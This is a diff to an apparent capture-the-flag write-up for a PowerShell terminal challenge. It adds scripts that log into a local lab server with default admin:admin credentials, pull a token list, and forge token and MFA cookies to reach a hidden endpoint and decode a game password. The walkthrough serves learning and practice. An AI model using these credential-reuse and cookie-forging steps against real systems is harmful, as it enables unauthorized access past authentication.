@@ -128,7 +128,33 @@ RelationLink      : {}
 > When you find it, communicate with the URL and print the contents to the terminal. 
 
 ```powershell
-$response = Invoke-WebRequest -Uri "http://127.0.0.1:1225" -Headers @{ Authorization = "Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))" } -UseBasicParsing; $response.Links | Where-Object { $_.href -like "http://localhost:1225/endpoints/*" } | ForEach-Object { $pageContent = Invoke-WebRequest -Uri $_.href -Headers @{ Authorization = "Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))" } -UseBasicParsing; if (($pageContent.Content -split '\s+').Count -eq 138) { Write-Output "Found page with 138 words: $($_.href)"; Write-Output $pageContent.Content; break } }
+# Define the base URL and credentials
+$baseUrl = "http://127.0.0.1:1225"
+$credentials = "admin:admin"
+$encodedAuth = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($credentials))
+
+# Set the headers for authorization
+$headers = @{ Authorization = "Basic $encodedAuth" }
+
+# Perform the initial web request to get the main page content
+$response = Invoke-WebRequest -Uri $baseUrl -Headers $headers -UseBasicParsing
+
+# Filter the links to those that match the endpoint pattern
+$endpointLinks = $response.Links | Where-Object { $_.href -like "http://localhost:1225/endpoints/*" }
+
+# Loop through each endpoint link
+foreach ($link in $endpointLinks) {
+    # Request the content of the current endpoint
+    $pageContent = Invoke-WebRequest -Uri $link.href -Headers $headers -UseBasicParsing
+
+    # Split the content into words and check if it contains exactly 138 words
+    if (($pageContent.Content -split '\s+').Count -eq 138) {
+        # Output the found page and its content
+        Write-Output "Found page with 138 words: $($link.href)"
+        Write-Output $pageContent.Content
+        break  # Stop searching after finding the first matching page
+    }
+}
 ```
 
 **Output**
@@ -144,17 +170,35 @@ Found page with 138 words: http://localhost:1225/endpoints/13
  That could be valuable, read the contents of that csv-file!
 
 ```powershell
-$response = Invoke-WebRequest -Uri "http://127.0.0.1:1225" -Headers @{ Authorization = "Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))" } -UseBasicParsing; 
-$response.Links | Where-Object { $_.href -like "http://localhost:1225/endpoints/*" } | ForEach-Object { 
-    $pageContent = Invoke-WebRequest -Uri $_.href -Headers @{ Authorization = "Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))" } -UseBasicParsing; 
-    if (($pageContent.Content -split '\s+').Count -eq 138) { 
-        if ($pageContent.Content -match '(http[^"]+\.csv)') { 
-            $csvUrl = $matches[1]; 
-            $csvContent = Invoke-WebRequest -Uri $csvUrl -Headers @{ Authorization = "Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))" } -UseBasicParsing; 
-            $csvContent.Content | Write-Output; 
-        } 
-        break 
-    } 
+# Define the base URL and credentials
+$baseUrl = "http://127.0.0.1:1225"
+$credentials = "admin:admin"
+$encodedAuth = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($credentials))
+$headers = @{ Authorization = "Basic $encodedAuth" }
+
+# Perform the initial web request to get the main page content
+$response = Invoke-WebRequest -Uri $baseUrl -Headers $headers -UseBasicParsing
+
+# Filter the links to those that match the endpoint pattern
+$endpointLinks = $response.Links | Where-Object { $_.href -like "http://localhost:1225/endpoints/*" }
+
+# Loop through each endpoint link
+foreach ($link in $endpointLinks) {
+    # Request the content of the current endpoint
+    $pageContent = Invoke-WebRequest -Uri $link.href -Headers $headers -UseBasicParsing
+    
+    # Check if the content has exactly 138 words
+    if (($pageContent.Content -split '\s+').Count -eq 138) {
+        # Search for a CSV URL in the content
+        if ($pageContent.Content -match '(http[^"]+\.csv)') {
+            $csvUrl = $matches[1]  # Extract the CSV URL from the match
+            
+            # Fetch the CSV content from the extracted URL
+            $csvContent = Invoke-WebRequest -Uri $csvUrl -Headers $headers -UseBasicParsing
+            $csvContent.Content | Write-Output  # Output the CSV content
+        }
+        break  # Stop searching after finding the first matching page
+    }
 }
 ```
 
@@ -278,7 +322,7 @@ Invoke-WebRequest -Uri "http://127.0.0.1:1225/tokens/$sha256Sum" -Headers @{
 Alternatively, I also used this - but the challenge text didn't change, but the output is nevertheless the same:
 
 ```powershell
-Invoke-WebRequest -Uri "http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C" -Headers @{ 'Cookie' = "token=5f8dd236f862f4507835b0e418907ffc" } -Credential "admin" -AllowUnencryptedAuthentication 
+Invoke-WebRequest -Uri "http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C" -Headers @{ 'Cookie' = "token=5f8dd236f862f4507835b0e418907ffc" } -Credential "admin" -AllowUnencryptedAuthentication;
 
 ```
 
@@ -310,30 +354,118 @@ RelationLink      : {}
 
 #### Task 10
 
-> 
+> 10) Sweet we got a MFA token! We might be able to get access to the system.
+ Validate that token at the endpoint!
 
 ```powershell
+# Fetch the content from the URL
+$response = Invoke-WebRequest -Uri "http://127.0.0.1:1225/token_overview.csv" -Headers @{
+    Authorization = "Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))"
+} -UseBasicParsing
 
+# Split the content into lines, filter out lines containing 'REDACTED', '#', 'file_MD5hash', or 'Sha256(file_MD5hash)'
+$filteredContent = $response.Content -split "`n" | Where-Object { 
+    $_ -notmatch "REDACTED" -and 
+    $_ -notmatch "#" -and 
+    $_ -notmatch "file_MD5hash" -and 
+    $_ -notmatch "Sha256\(file_MD5hash\)" 
+}
+
+# Convert the filtered lines into an object (in-memory CSV structure)
+$csvData = $filteredContent | ForEach-Object {
+    $fields = $_ -split ","  # Split each line by commas into an array of fields
+    [PSCustomObject]@{
+        Column1 = $fields[0]
+        Column2 = $fields[1]
+    }
+}
+
+$sha256Sum = $csvData.Column2
+$md5Sum = $csvData.Column1
+
+$response = Invoke-WebRequest -Uri "http://127.0.0.1:1225/tokens/$sha256Sum" -Headers @{
+    Authorization = "Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))"
+    Cookie = "token=$md5Sum"
+} -UseBasicParsing
+
+$time_code = [regex]::match($response.Content,"href='(.+)'").Groups[1].Value
+$urlpath = [regex]::match($response.Content,"'>(.+)</a>").Groups[1].Value
+
+$response = Invoke-WebRequest -Uri "http://127.0.0.1:1225$urlpath" -Headers @{
+    Authorization = "Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))"
+    Cookie = "mfa_code=$time_code; token=$md5Sum; mfa_token=$time_code"
+} -UseBasicParsing
+
+$response.Content
 ```
 
 **Output**
 
 ```
-
+Q29ycmVjdCBUb2tlbiBzdXBwbGllZCwgeW91IGFyZSBncmFudGVkIGFjY2VzcyB0byB0aGUgc25vdyBjYW5ub24gdGVybWluYWwuIEhlcmUgaXMgeW91ciBwZXJzb25hbCBwYXNzd29yZCBmb3IgYWNjZXNzOiBTbm93TGVvcGFyZDJSZWFkeUZvckFjdGlvbg==
 ```
 
+Inside the HTML there is a Base64 string, which decodes to: 
 
+```
+Correct Token supplied, you are granted access to the snow cannon terminal. Here is your personal password for access: SnowLeopard2ReadyForAction
+```
 
-#### Task X
+#### Task 11
 
-> 
+> 11) That looks like base64! Decode it so we can get the final secret!
 
 ```powershell
+# Fetch the content from the URL
+$response = Invoke-WebRequest -Uri "http://127.0.0.1:1225/token_overview.csv" -Headers @{
+    Authorization = "Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))"
+} -UseBasicParsing
 
+# Split the content into lines, filter out lines containing 'REDACTED', '#', 'file_MD5hash', or 'Sha256(file_MD5hash)'
+$filteredContent = $response.Content -split "`n" | Where-Object { 
+    $_ -notmatch "REDACTED" -and 
+    $_ -notmatch "#" -and 
+    $_ -notmatch "file_MD5hash" -and 
+    $_ -notmatch "Sha256\(file_MD5hash\)" 
+}
+
+# Convert the filtered lines into an object (in-memory CSV structure)
+$csvData = $filteredContent | ForEach-Object {
+    $fields = $_ -split ","  # Split each line by commas into an array of fields
+    [PSCustomObject]@{
+        Column1 = $fields[0]
+        Column2 = $fields[1]
+    }
+}
+
+$sha256Sum = $csvData.Column2
+$md5Sum = $csvData.Column1
+
+$response = Invoke-WebRequest -Uri "http://127.0.0.1:1225/tokens/$sha256Sum" -Headers @{
+    Authorization = "Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))"
+    Cookie = "token=$md5Sum"
+} -UseBasicParsing
+
+$time_code = [regex]::match($response.Content,"href='(.+)'").Groups[1].Value
+$urlpath = [regex]::match($response.Content,"'>(.+)</a>").Groups[1].Value
+
+$response = Invoke-WebRequest -Uri "http://127.0.0.1:1225$urlpath" -Headers @{
+    Authorization = "Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))"
+    Cookie = "mfa_code=$time_code; token=$md5Sum; mfa_token=$time_code"
+} -UseBasicParsing
+
+[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String([regex]::match($response.Content,"<p>(.+)</p>").Groups[1].Value))
 ```
 
-**Output**
+**Output 1**
 
 ```
-
+Correct Token supplied, you are granted access to the snow cannon terminal. Here is your personal password for access: SnowLeopard2ReadyForAction
 ```
+
+#### Final
+
+> Hurray! You have thwarted their defenses!
+> Alabaster can now access their weaponry and put a stop to it.
+> Once HHC grants your achievement, you can close this terminal.
+
